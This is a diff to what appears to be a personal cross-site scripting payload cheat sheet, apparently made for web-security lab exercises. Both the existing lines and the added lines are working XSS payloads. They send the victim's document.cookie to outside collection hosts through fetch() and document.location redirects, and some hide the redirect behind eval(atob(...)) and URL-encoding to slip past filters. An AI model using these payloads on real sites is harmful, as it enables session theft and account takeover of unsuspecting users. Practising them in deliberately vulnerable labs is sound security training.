@@ -98,6 +98,15 @@ fetch(https://OASTIFY.COM/?jsonc= + window["document"]["cookie"]) <-BASE64
 "-eval(atob("BASE64"))-"  <-URLENCODE
 
 \';document.location=https://OASTIFY.COM/?BackTicks=+document.cookie;//
+
+%22-eval(atob(%27location='https://exploit-0a2e00b503d5b83e8b00c180014300bf.exploit-server.net/exploit'+window["document"]["cookie"]%27))-%22
+
+
+<script>
+location='https://lab_id.web-security-academy.net/?SearchTerm="-eval(atob("base64"))-"'
+</script
+base64 -> location=`https://exploit-exploit_id.exploit-server.net/log?c=`+window["document"]["cookie"]
+
 ```
 
 
